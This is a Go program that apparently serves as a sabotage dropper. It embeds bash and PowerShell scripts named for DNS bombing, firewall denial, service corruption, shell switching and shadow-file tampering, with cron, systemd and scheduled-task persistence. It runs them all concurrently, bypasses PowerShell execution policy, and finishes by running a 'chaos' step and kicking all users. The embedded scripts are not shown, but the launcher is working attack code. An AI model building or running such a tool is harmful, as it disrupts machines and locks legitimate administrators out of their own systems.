package main

import (
    _ "embed"
    "sync"
    "os/exec"
    "bytes"
    "fmt"
    "os"
    "path/filepath"
)

// Linux scripts
//go:embed scripts/cron_dns_bomb.sh
var cron_dns_bomb []byte

//go:embed scripts/sysd_dns_bomb.sh
var sysd_dns_bomb []byte

//go:embed scripts/firewall_deny.sh
var firewall_deny_sh []byte

//go:embed scripts/firewall_deny_cron.sh
var firewall_deny_cron []byte

//go:embed scripts/firewall_deny_systemd.sh
var firewall_deny_systemd []byte

//go:embed scripts/prompt_space.sh
var prompt_space_sh []byte

//go:embed scripts/prompt_space_cron.sh
var prompt_space_cron []byte

//go:embed scripts/prompt_space_systemd.sh
var prompt_space_systemd []byte

//go:embed scripts/service_corrupt.sh
var service_corrupt_sh []byte

//go:embed scripts/service_corrupt_cron.sh
var service_corrupt_cron []byte

//go:embed scripts/service_corrupt_sysd.sh
var service_corrupt_sysd []byte

//go:embed scripts/stop_shell_switch1.sh
var stop_shell_switch1 []byte

//go:embed scripts/stop_shell_switch2.sh
var stop_shell_switch2 []byte

// chaos - runs last
//go:embed scripts/crazy_shadow.sh
var crazy_shadow_sh []byte

//go:embed scripts/kick_all.sh
var kick_all []byte

// Windows scripts
//go:embed scripts/dns_lock.ps1
var dns_lock_ps1 []byte

//go:embed scripts/dns_persist_lock.ps1
var dns_persist_lock_ps1 []byte

//go:embed scripts/firewall_deny.ps1
var firewall_deny_ps1 []byte

//go:embed scripts/firewall_deny_task.ps1
var firewall_deny_task_ps1 []byte

//go:embed scripts/prompt_space.ps1
var prompt_space_ps1 []byte

//go:embed scripts/prompt_space_task.ps1
var prompt_space_task_ps1 []byte

//go:embed scripts/service_corrupt.ps1
var service_corrupt_ps1 []byte

//go:embed scripts/service_corrupt_task.ps1
var service_corrupt_task_ps1 []byte

func run_bash(script []byte, wg *sync.WaitGroup) {
    defer wg.Done()
    cmd := exec.Command("bash")
    cmd.Stdin = bytes.NewReader(script)
    cmd.Run()
}

func run_ps1(script []byte, wg *sync.WaitGroup) {
    defer wg.Done()
    tmp, err := os.CreateTemp("", "*.ps1")
    if err != nil {
        return
    }
    defer os.Remove(tmp.Name())
    tmp.Write(script)
    tmp.Close()
    cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", filepath.Clean(tmp.Name()))
    cmd.Run()
}

func main() {
    var wg sync.WaitGroup

    bash_scripts := [][]byte{
        cron_dns_bomb,
        sysd_dns_bomb,
        firewall_deny_sh,
        firewall_deny_cron,
        firewall_deny_systemd,
        prompt_space_sh,
        prompt_space_cron,
        prompt_space_systemd,
        service_corrupt_sh,
        service_corrupt_cron,
        service_corrupt_sysd,
        stop_shell_switch1,
        stop_shell_switch2,
    }

    ps1_scripts := [][]byte{
        dns_lock_ps1,
        dns_persist_lock_ps1,
        firewall_deny_ps1,
        firewall_deny_task_ps1,
        prompt_space_ps1,
        prompt_space_task_ps1,
        service_corrupt_ps1,
        service_corrupt_task_ps1,
    }

    // fire everything concurrently
    for _, s := range bash_scripts {
        wg.Add(1)
        go run_bash(s, &wg)
    }
    for _, s := range ps1_scripts {
        wg.Add(1)
        go run_ps1(s, &wg)
    }

    // wait for all main scripts to finish
    wg.Wait()

    // chaos finale - aliases drop after everything is persisted
    var chaos_wg sync.WaitGroup
    for _, s := range [][]byte{crazy_shadow_sh} {
        chaos_wg.Add(1)
        go run_bash(s, &chaos_wg)
    }
    chaos_wg.Wait()

    fmt.Println("FINISHED")

    kick := exec.Command("bash")
    kick.Stdin = bytes.NewReader(kick_all)
    kick.Start()
}